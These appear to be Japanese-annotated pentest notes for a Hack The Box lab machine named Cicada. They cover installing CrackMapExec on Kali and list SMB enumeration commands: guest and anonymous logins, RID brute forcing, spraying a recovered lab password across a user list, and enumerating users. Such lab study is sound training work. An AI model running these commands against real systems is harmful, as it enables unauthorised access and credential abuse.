## Ready
```
sudo apt-get install -y libssl-dev libffi-dev python2-dev build-essential
git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
cd CrackMapExec
curl -sSL https://install.python-poetry.org | python3 -
export PATH="/home/kali/.local/bin:$PATH"
poetry --version
# Poetry の keyring 機能を無効にしてインストールを試みる
export PYTHON_KEYRING_BACKEND=keyring.backends.null.Keyring
poetry install
poetry run pip install termcolor
poetry run pip install python-libnmap
poetry run pip install xmltodict
poetry run pip install sqlalchemy
poetry run pip install terminaltables
poetry run crackmapexec

# This is Hit!!
poetry env remove python
poetry env use python3.11  # 3.11 がない場合は 3.10 か 3.9 に変更
poetry install
poetry run crackmapexec -h
```
## 調査確認
#### デフォルト
`poetry run crackmapexec smb cicada.htb --shares`
#### guest等のデフォルトで使用されている可能性のあるクレデンシャルの調査
`poetry run crackmapexec smb cicada.htb -u 'guest' -p '' --shares`
#### RID ブルートフォース
`poetry run crackmapexec smb 10.10.11.35 -u anonymous -p '' --rid-brute`
#### txtでリバースブルートフォース
`poetry run crackmapexec smb cicada.htb -u ../users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'`
#### 取得したクレデンシャルで再度調査
`poetry run crackmapexec smb cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares`
#### Userの調査
`poetry run crackmapexec smb cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users`

